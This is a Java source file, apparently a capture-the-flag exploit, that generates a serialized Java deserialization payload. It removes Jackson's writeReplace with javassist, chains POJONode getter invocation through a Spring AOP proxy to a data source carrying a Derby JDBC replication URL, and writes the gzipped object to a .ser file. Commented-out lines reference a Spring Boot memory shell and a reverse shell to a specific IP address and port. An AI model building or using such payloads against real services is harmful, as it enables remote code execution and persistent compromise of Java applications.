package gadget.timu;

import com.fasterxml.jackson.databind.node.POJONode;
import com.galery.art.tools.CustomDataSource;
import com.galery.art.tools.PendingDataSource;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
//import org.springframework.aop.framework.AdvisedSupport;
import org.springframework.aop.framework.AdvisedSupport;
import util.ReflectionUtils;
import util.TriggertoStringUtils;

import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.zip.GZIPOutputStream;

public class r3a {

    //BadAttributeValueExpException.toString -> POJONode -> getter -> TemplatesImpl
        public static void main(String[] args) throws Exception {

//        final Object template = GadgetUtils.createTemplatesImpl(SpringBootMemoryShellOfController.class);

//        final Object template = GadgetUtils.templatesImplLocalWindows();
            CtClass ctClass = ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode");
            CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
            ctClass.removeMethod(writeReplace);
            // 将修改后的CtClass加载至当前线程的上下文类加载器中
            ctClass.toClass();
//        Object template = GadgetUtils.getTemplatesImplReverseShell("114.67.236.137","19005");
            POJONode node = new POJONode(makeTemplatesImplAopProxy());
//        POJONode node = new POJONode(template);


            Object o = TriggertoStringUtils.xString1(node);
//        BadAttributeValueExpException o = new BadAttributeValueExpException(node);
//        Field valfield = val.getClass().getDeclaredField("val");
//        valfield.setAccessible(true);
//        valfield.set(val, node);
//        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
//        ObjectOutputStream oos = new ObjectOutputStream(byteArrayOutputStream);
//        oos.writeObject(val);\
//        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
//        ObjectOutputStream oos = new ObjectOutputStream(byteArrayOutputStream);
//        oos.writeObject(o);
          serialize(o);
//        InputStream inputStream = new ByteArrayInputStream(bytes1);
//        MyObjectInputStream myObjectInputStream = new MyObjectInputStream(inputStream);
//        ByteCompare byteCompare = new ByteCompare();
//        byteCompare.Compared(bytes1);
//        myObjectInputStream.readObject();

//            System.out.println(Base64.getEncoder().encodeToString(bytes1));
        }

    public static String serialize(final Object obj) throws IOException {
        FileOutputStream fileOutputStream = new FileOutputStream("squirt1e.ser");
        serialize(obj,fileOutputStream);
        fileOutputStream.close();
        return "test1.ser";
    }
    public static void serialize(final Object obj, final OutputStream out) throws IOException {

        GZIPOutputStream gzipOutputStream = new GZIPOutputStream(out);
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(gzipOutputStream);
        objectOutputStream.writeObject(obj);
        objectOutputStream.flush();
        gzipOutputStream.finish();

    }

        public static Object makeTemplatesImplAopProxy() throws Exception {
            AdvisedSupport advisedSupport = new AdvisedSupport();
            CustomDataSource customDataSource = new CustomDataSource();
            ReflectionUtils.setFieldValue(customDataSource,"conStr","jdbc:derby:dbname;startMaster=true;slaveHost=127.0.0.1");
//        Object template = GadgetUtils.createTemplatesImpl(SpringBootMemoryShellOfController.class);
//        Object template = GadgetUtils.createTemplatesImpl(SpringBootMemoryShellOfController.class);
//        Object template = GadgetUtils.getTemplatesImplReverseShell()
            advisedSupport.setTarget(customDataSource);
            Constructor constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);
            constructor.setAccessible(true);
            InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);
            Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{PendingDataSource.class}, handler);
            return proxy;
        }
    }

